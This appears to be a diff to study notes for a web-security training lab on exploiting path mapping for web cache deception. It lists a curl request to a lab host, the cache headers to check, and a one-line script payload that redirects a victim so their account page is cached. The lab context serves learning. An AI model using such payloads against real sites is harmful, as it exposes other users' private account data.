@@ -41,10 +41,10 @@ You can then craft a URL that returns a dynamic response that is stored in the c
 
 # Lab: Exploiting path mapping for web cache deception
 1. curl 'https://0ada00640380e01585758164009100b5.web-security-academy.net/my-account/abc.css'
-2. Caching Headers
-   cache-control: max-age=30
-   age: 0
-   x-cache: miss
+2. Look for caching Headers and sensitives in response
+   cache-control: max-age=30<br>
+   age: 0<br>
+   x-cache: miss<br>
 3. Exploit : Craft a Javascript payload and sent it to victim.
 4. <script>document.location="http://vulnerable.tld/path/foo..css"</script>
 
